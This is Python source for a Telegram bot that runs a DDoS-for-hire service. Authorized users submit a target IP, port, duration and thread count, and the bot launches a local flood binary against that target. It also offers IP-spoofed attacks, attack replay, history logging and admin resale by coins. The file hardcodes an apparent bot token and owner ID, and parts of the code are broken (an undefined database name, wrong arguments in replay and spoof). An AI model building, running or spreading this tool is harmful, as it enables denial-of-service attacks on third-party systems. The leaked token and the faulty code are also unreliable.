import os
import json
import time
import random
import string
import subprocess
import threading
import sqlite3
import traceback
from datetime import datetime, timedelta
from dateutil.relativedelta import relativedelta
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext
import telebot
from telebot import types

# Replace with your Telegram bot token
TELEGRAM_BOT_TOKEN = "7519734348:AAH6grCtysibCCb62AXxgIx9lydeB9wMHhQ"

# Replace with your owner user ID (you can get this by sending /start to your bot and checking the logs)
OWNER_USER_ID = 708030615  # Replace with your actual owner user ID

# Initialize the bot
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# Global variables
MAX_ATTACK_TIME = 300  # Maximum allowed attack time in seconds (5 minutes)
MAX_THREADS = 99999     # New safety limit
ongoing_attack = None
current_attack_start_time = None
current_attack_duration = None
current_attack_target = None
current_attack_port = None

# ---------------------------
# Database Functions (No Changes)
# ---------------------------

def initialize_database():
    conn = sqlite3.connect(DATABASE_NAME)
    cursor = conn.cursor()

    # Create users table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            duration TEXT
        )
    """)

    # Create admins table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS admins (
            user_id INTEGER PRIMARY KEY,
            coins INTEGER
        )
    """)

    # Create attack_history table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS attack_history (
            user_id INTEGER,
            type TEXT,
            target TEXT,
            port INTEGER,
            duration INTEGER,
            spoofed_ip TEXT,
            timestamp TEXT
        )
    """)

    # Add the owner as an admin with unlimited coins
    cursor.execute("""
        INSERT OR IGNORE INTO admins (user_id, coins) VALUES (?, ?)
    """, (OWNER_USER_ID, float("inf")))

    conn.commit()
    conn.close()

# Function to add a user to the database
def add_user(user_id, duration_str):
    conn = sqlite3.connect(DATABASE_NAME)
    cursor = conn.cursor()
    cursor.execute("""
        INSERT OR REPLACE INTO users (user_id, duration) VALUES (?, ?)
    """, (user_id, duration_str))
    conn.commit()
    conn.close()
    return f"User {user_id} added with duration: {duration_str}"

# Function to retrieve all users from the database
def get_users():
    conn = sqlite3.connect(DATABASE_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM users")
    users = {row[0] for row in cursor.fetchall()}
    conn.close()
    return users

# Function to add an admin to the database
def add_admin(user_id, coins):
    conn = sqlite3.connect(DATABASE_NAME)
    cursor = conn.cursor()
    cursor.execute("""
        INSERT OR REPLACE INTO admins (user_id, coins) VALUES (?, ?)
    """, (user_id, coins))
    conn.commit()
    conn.close()
    return f"Admin {user_id} added with {coins} coins."

# Function to retrieve all admins from the database
def get_admins():
    conn = sqlite3.connect(DATABASE_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM admins")
    admins = {row[0] for row in cursor.fetchall()}
    conn.close()
    return admins

# Function to add an attack to the user's history in the database
def add_attack_history(user_id, attack_type, target, port, duration, spoofed_ip=None):
    conn = sqlite3.connect(DATABASE_NAME)
    cursor = conn.cursor()
    cursor.execute("""
        INSERT INTO attack_history (user_id, type, target, port, duration, spoofed_ip, timestamp)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    """, (user_id, attack_type, target, port, duration, spoofed_ip, time.strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit()
    conn.close()

# Function to retrieve the attack history for a user from the database
def get_attack_history(user_id):
    conn = sqlite3.connect(DATABASE_NAME)
    cursor = conn.cursor()
    cursor.execute("""
        SELECT type, target, port, duration, spoofed_ip, timestamp
        FROM attack_history
        WHERE user_id = ?
    """, (user_id,))
    history = cursor.fetchall()
    conn.close()
    return history

# Initialize the database when the script starts
initialize_database()

# Dictionary to store monitoring status for each user
monitoring_users = set()

# Function to send monitoring updates
def send_monitoring_update(message):
    global ongoing_attack, current_attack_start_time, current_attack_duration
    if ongoing_attack:
        elapsed_time = int(time.time() - current_attack_start_time)
        remaining_time = current_attack_duration - elapsed_time
        update_message = f"🕒 Attack in progress: {elapsed_time}/{current_attack_duration} seconds"
        bot.reply_to(message, update_message)

# Command: /start
@bot.message_handler(commands=["start"])
def send_start_message(message):
    chat_id = message.chat.id  # Get chat ID from message
    
    bot.send_message(chat_id, "🌀 *𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗧𝗛𝗘 𝐍𝐎𝐎𝐁 𝐀𝐌 𝐖𝐎𝐑𝐋𝐃* 🌀", parse_mode="Markdown")
    time.sleep(1)

    bot.send_message(chat_id, "🚀 *𝗦𝘆𝘀𝘁𝗲𝗺 𝗜𝗻𝗶𝘁𝗶𝗮𝗹𝗶𝘇𝗶𝗻𝗴...*", parse_mode="Markdown")
    time.sleep(1)

    bot.send_message(chat_id, "⏳ *𝗟𝗼𝗮𝗱𝗶𝗻𝗴 𝗧𝗮𝗿𝗴𝗲𝘁 𝗗𝗮𝘁𝗮...*", parse_mode="Markdown")
    time.sleep(1)

    bot.send_message(chat_id, "💥 *𝗔𝗿𝗺𝗶𝗻𝗴 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗾𝘂𝗲𝗻𝗰𝗲...*", parse_mode="Markdown")
    time.sleep(1)

    bot.send_message(chat_id, "🔰 *𝗥𝗲𝗮𝗱𝘆 𝗧𝗼 𝗙𝗶𝗿𝗲!*", parse_mode="Markdown")
    time.sleep(1)

    bot.send_message(chat_id, "🎯 *𝐈𝐅 𝐘𝐎𝐔 𝐃𝐎𝐍'𝐓 𝐇𝐀𝐕𝐄 𝐀𝐂𝐂𝐄𝐒𝐒 𝐏𝐋𝐙 𝐃𝐌 @𝐍𝐎𝐎𝐁_𝐀𝐌*", parse_mode="Markdown")



# Command: /help
@bot.message_handler(commands=["help"])
def help_command(message):
    response = (
        "🛠️ Available Commands:\n\n"
        "- /start: Start the bot.\n"
        "- /help: Show this help message.\n"
        "- /attack <target> <port> <duration>: Initiate an attack.\n"
        "- /replay: Replay the last attack.\n"
        "- /spoof <target> <port> <duration> <spoofed_ip>: Simulate an IP spoofing attack.\n"
        "- /monitor: Monitor an ongoing attack.\n"
        "- /history: View your attack history.\n"
        "- /status: Check the status of the current attack.\n"
        "- /stop: Stop an ongoing attack.\n"
        "- /addadmin <userid> <coins>: Add a new admin (owner only).\n"
        "- /adduser <userid> <duration>: Add a new user.\n"
    )
    # Send message without Markdown
    bot.send_message(message.chat.id, response)

# Command: /addadmin
@bot.message_handler(commands=["addadmin"])
def add_admin_command(message):
    user_id = int(message.chat.id)

    # Check if the user is the owner
    if user_id != OWNER_USER_ID:
        bot.reply_to(message, "🚫 You are not authorized to use this command.")
        return

    if len(message.text.split()) < 3:
        bot.reply_to(message, "❌ Usage: /addadmin <userid> <coins>")
        return

    details = message.text.split()
    new_admin_id = int(details[1])
    coins = int(details[2])

    # Add the new admin
    result = add_admin(new_admin_id, coins)
    bot.reply_to(message, result)

# Command: /adduser
@bot.message_handler(commands=["adduser"])
def add_user_command(message):
    user_id = int(message.chat.id)

    # Check if the user is an admin
    admins = get_admins()
    if user_id not in admins:
        bot.reply_to(message, "🚫 You are not authorized to use this command.")
        return

    if len(message.text.split()) < 3:
        bot.reply_to(message, "❌ Usage: /adduser <userid> <duration>")
        return

    details = message.text.split()
    user_id_to_add = details[1]
    duration_str = " ".join(details[2:])
    result = add_user(user_id_to_add, duration_str)
    bot.reply_to(message, result)

# Command: /attack
@bot.message_handler(commands=["attack"])
def attack_command(message):
    global ongoing_attack

    user_id = message.chat.id

    # Authorization check
    authorized_users = get_users()
    if user_id not in authorized_users:
        bot.reply_to(message, "🚫 You are not authorized! Contact @NOOB_AM")
        return

    if ongoing_attack:
        elapsed_time = int(time.time() - current_attack_start_time)
        remaining_time = current_attack_duration - elapsed_time
        bot.reply_to(message, f"⏳ Cooldown! Attack running ({remaining_time}s remaining)")
        return

    # New input format
    msg = bot.reply_to(message, "⚡ Enter in format:\n[IP] [PORT] [TIME(s)] [THREADS]\nExample: 1.1.1.1 80 120 500")
    bot.register_next_step_handler(msg, process_attack_details)

# Fixed process_attack_details
def process_attack_details(message):
    global ongoing_attack, current_attack_start_time, current_attack_duration

    # Validation checks added
    if not message or not message.text:
        bot.reply_to(message, "❌ Empty input! Send: IP PORT TIME THREADS")
        return

    try:
        parts = message.text.strip().split()
        if len(parts) != 4:
            raise ValueError("Invalid format: Need 4 parameters")

        target = parts[0]
        port = int(parts[1])
        attack_time = int(parts[2])
        threads = int(parts[3])

        # Parameter validation
        if not (0 < port <= 65535):
            raise ValueError("Invalid port (1-65535)")
            
        if attack_time > MAX_ATTACK_TIME:
            raise ValueError(f"Max attack time: {MAX_ATTACK_TIME}s")
            
        if threads > MAX_THREADS:
            raise ValueError(f"Max threads: {MAX_THREADS}")

        # Log attack
        add_attack_history(message.chat.id, "attack", target, port, attack_time)

        # Start attack
        ongoing_attack = True
        current_attack_start_time = time.time()
        current_attack_duration = attack_time
        current_attack_target = target
        current_attack_port = port

        # Start attack thread
        threading.Thread(
            target=run_attack,
            args=(target, port, attack_time, threads, message)
        ).start()

        bot.reply_to(message, f"🔥 Attack on {target}:{port} for {attack_time}s with {threads} threads!")

    except ValueError as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")
    except Exception as e:
        bot.reply_to(message, f"💥 Critical error: {str(e)}")
        print(traceback.format_exc())

# Fixed run_attack function
def run_attack(target, port, attack_time, threads, message):
    global ongoing_attack

    try:
        BINARY_PATH = os.path.abspath("./noobam")
        
        # Binary checks
        if not os.path.exists(BINARY_PATH):
            raise FileNotFoundError("noobam binary missing!")
            
        if not os.access(BINARY_PATH, os.X_OK):
            os.chmod(BINARY_PATH, 0o755)

        # Build command
        cmd = [
            BINARY_PATH,
            target,
            str(port),
            str(attack_time),
            str(threads)
        ]

        # Execute with real-time output
        with subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        ) as process:
            
            # Read output line by line
            for line in iter(process.stdout.readline, ''):
                if line.strip():
                    bot.reply_to(message, f"📡 {line.strip()}")

            # Check exit code
            exit_code = process.wait()
            if exit_code == 0:
                bot.reply_to(message, "✅ Attack completed successfully!")
            else:
                bot.reply_to(message, f"❌ Attack failed (Code: {exit_code})")

    except Exception as e:
        bot.reply_to(message, f"💥 Execution Error: {str(e)}")
        print(traceback.format_exc())
    finally:
        ongoing_attack = False
        current_attack_start_time = None


# Command: /replay
@bot.message_handler(commands=["replay"])
def replay_command(message):
    global ongoing_attack

    user_id = str(message.chat.id)

    # Check if the user has previous attack details
    history = get_attack_history(user_id)
    if not history:
        bot.reply_to(message, "ℹ️ No previous attack details found. Use /attack first.")
        return

    # Get the last attack details
    last_attack = history[-1]
    target = last_attack[1]
    port = last_attack[2]
    duration = last_attack[3]

    # Add the replay to the user's history
    add_attack_history(user_id, "replay", target, port, duration)

    # Start the attack
    bot.reply_to(message, f"🚀 Replaying attack on {target}:{port} for {duration} seconds...")
    threading.Thread(target=run_attack, args=(f"./noobam {target} {port} {duration} 999 999", duration, message)).start()

# Command: /spoof
@bot.message_handler(commands=["spoof"])
def spoof_command(message):
    global ongoing_attack

    user_id = str(message.chat.id)

    if ongoing_attack:
        elapsed_time = int(time.time() - current_attack_start_time)
        remaining_time = current_attack_duration - elapsed_time
        response = (
            f"⏳ Cooldown active! An attack is already running.\n"
            f"⏱️ Remaining time: {remaining_time} seconds\n"
            f"Use /status to monitor the attack."
        )
        bot.reply_to(message, response)
        return

    if len(message.text.split()) < 4:
        bot.reply_to(message, "❌ Usage: /spoof <target> <port> <duration> <spoofed_ip>")
        return

    details = message.text.split()
    target = details[1]
    port = int(details[2])
    duration = int(details[3])
    spoofed_ip = details[4]

    # Add the spoofed attack to the user's history
    add_attack_history(user_id, "spoof", target, port, duration, spoofed_ip)

    # Start the spoofed attack
    bot.reply_to(message, f"🚀 Starting spoofed attack from {spoofed_ip} to {target}:{port} for {duration} seconds...")
    threading.Thread(target=run_attack, args=(f"./noobam {target} {port} {duration} 999 999", duration, message)).start()

# Command: /monitor
@bot.message_handler(commands=["monitor"])
def monitor_command(message):
    global ongoing_attack

    if not ongoing_attack:
        bot.reply_to(message, "ℹ️ No ongoing attack to monitor.")
        return

    monitoring_users.add(message.chat.id)
    bot.reply_to(message, "🔍 You are now monitoring the ongoing attack.")

# Command: /history
@bot.message_handler(commands=["history"])
def history_command(message):
    user_id = str(message.chat.id)

    # Check if the user has any attack history
    history = get_attack_history(user_id)
    if not history:
        bot.reply_to(message, "ℹ️ No attack history found.")
        return

    # Build the history message
    history_message = "📜 Your Attack History:\n\n"
    for entry in history:
        if entry[0] == "spoof":
            history_message += (
                f"🕒 {entry[5]}\n"
                f"🔧 Type: Spoofed Attack\n"
                f"🎯 Target: {entry[1]}:{entry[2]}\n"
                f"⏱️ Duration: {entry[3]} seconds\n"
                f"📡 Spoofed IP: {entry[4]}\n\n"
            )
        else:
            history_message += (
                f"🕒 {entry[5]}\n"
                f"🔧 Type: {'Attack' if entry[0] == 'attack' else 'Replay'}\n"
                f"🎯 Target: {entry[1]}:{entry[2]}\n"
                f"⏱️ Duration: {entry[3]} seconds\n\n"
            )

    bot.reply_to(message, history_message)

# Command: /status
@bot.message_handler(commands=["status"])
def status_command(message):
    global ongoing_attack, current_attack_start_time, current_attack_duration, current_attack_target, current_attack_port

    if not ongoing_attack:
        bot.reply_to(message, "ℹ️ No ongoing attack.")
        return

    elapsed_time = int(time.time() - current_attack_start_time)
    remaining_time = current_attack_duration - elapsed_time
    response = (
        f"🕒 Attack in progress:\n"
        f"🎯 Target: {current_attack_target}:{current_attack_port}\n"
        f"⏱️ Elapsed time: {elapsed_time} seconds\n"
        f"⏳ Remaining time: {remaining_time} seconds"
    )
    bot.reply_to(message, response)

# Command: /stop
@bot.message_handler(commands=["stop"])
def stop_command(message):
    global ongoing_attack

    if not ongoing_attack:
        bot.reply_to(message, "ℹ️ No ongoing attack to stop.")
        return

    ongoing_attack = False
    bot.reply_to(message, "🛑 Attack stopped.")

# Start the bot
if __name__ == "__main__":
    print("SCRIPT BY AM")
    bot.polling()